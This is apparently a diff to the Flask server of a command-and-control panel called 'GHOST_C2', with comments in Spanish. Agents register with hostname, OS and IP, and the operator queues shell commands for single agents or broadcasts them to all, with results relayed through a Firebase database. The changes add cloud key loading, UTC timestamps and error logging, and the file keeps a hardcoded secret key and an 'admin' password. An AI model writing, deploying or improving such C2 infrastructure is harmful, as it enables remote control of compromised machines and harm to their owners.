@@ -19,15 +19,24 @@ app = Flask(__name__)
 app.secret_key = "GHOST_C2_ULTRA_SECRET_KEY_99" 
 
 # --- CONFIGURACIÓN FIREBASE ---
-# DEBES SUBIR TU ARCHIVO firebase-key.json AL DIRECTORIO RAÍZ
 if not firebase_admin._apps:
     try:
-        cred = credentials.Certificate("firebase-key.json")
+        # Intentar cargar desde variable de entorno (para Render/Nube)
+        env_key = os.environ.get("FIREBASE_KEY_JSON")
+        if env_key:
+            key_data = json.loads(env_key)
+            cred = credentials.Certificate(key_data)
+        else:
+            # Fallback al archivo local
+            cred = credentials.Certificate("firebase-key.json")
+            
         firebase_admin.initialize_app(cred, {
             'databaseURL': 'https://holaaa-2ca32-default-rtdb.europe-west1.firebasedatabase.app'
         })
+        print("Firebase inicializado correctamente")
     except Exception as e:
-        print(f"Error cargando Firebase: {e}")
+        print(f"Error crítico cargando Firebase: {e}")
+
 
 # CONFIGURACIÓN DE ACCESO
 ADMIN_PASS = "admin"
@@ -81,21 +90,22 @@ def dashboard_page():
 def api_get_agents():
     ref = db.reference('agents')
     agents = ref.get() or {}
-    now = datetime.now()
+    now = datetime.utcnow()
     active_agents = {}
     
     for aid, data in agents.items():
         try:
-            last_seen = datetime.fromisoformat(data.get('last_seen', '2000-01-01T00:00:00'))
-            # Si lleva más de 60 segundos sin dar señales, lo borramos de Firebase
+            last_seen_str = data.get('last_seen', '2000-01-01T00:00:00')
+            last_seen = datetime.fromisoformat(last_seen_str)
+            
+            # Si no ha reportado en más de 60 segundos, lo borramos de firebase
             if (now - last_seen).total_seconds() > 60:
                 ref.child(aid).delete()
-                # También borramos sus comandos y resultados para limpiar la DB
                 db.reference(f'commands/{aid}').delete()
-                # db.reference(f'results/{aid}').delete() # Opcional: mantener resultados
             else:
                 active_agents[aid] = data
-        except: pass
+        except Exception as e: 
+            print(f"Error procesando agente {aid}: {e}")
         
     return jsonify(active_agents)
 
@@ -117,23 +127,23 @@ def api_send_command():
         agents = ref.get() or {}
         count = 0
         for aid in agents.keys():
-            db.reference(f'commands/{aid}').push({"cmd": cmd, "time": datetime.now().isoformat()})
+            db.reference(f'commands/{aid}').push({"cmd": cmd, "time": datetime.utcnow().isoformat()})
             # Log en cada agente para que se vea en su historial individual
             db.reference(f'results/{aid}').push({
                 "result": f"[BROADCAST] > {cmd}", 
-                "timestamp": datetime.now().strftime("%H:%M:%S")
+                "timestamp": datetime.utcnow().strftime("%H:%M:%S")
             })
             count += 1
         return jsonify({"status": "broadcast_sent", "count": count})
 
     if agent_id and cmd:
         # 1. Enviar comando a la cola del agente
-        db.reference(f'commands/{agent_id}').push({"cmd": cmd, "time": datetime.now().isoformat()})
+        db.reference(f'commands/{agent_id}').push({"cmd": cmd, "time": datetime.utcnow().isoformat()})
         
         # 2. Registrar comando en el historial visual (resultados) para que se vea en el chat
         db.reference(f'results/{agent_id}').push({
             "result": f"> {cmd}", 
-            "timestamp": datetime.now().strftime("%H:%M:%S")
+            "timestamp": datetime.utcnow().strftime("%H:%M:%S")
         })
         return jsonify({"status": "queued"})
     return jsonify({"status": "error"}), 400
@@ -155,7 +165,7 @@ def agent_register():
         "hostname": data.get('hostname'),
         "os": data.get('os'),
         "ip": request.remote_addr,
-        "last_seen": datetime.now().isoformat()
+        "last_seen": datetime.utcnow().isoformat()
     })
     return jsonify({"status": "ok"})
 
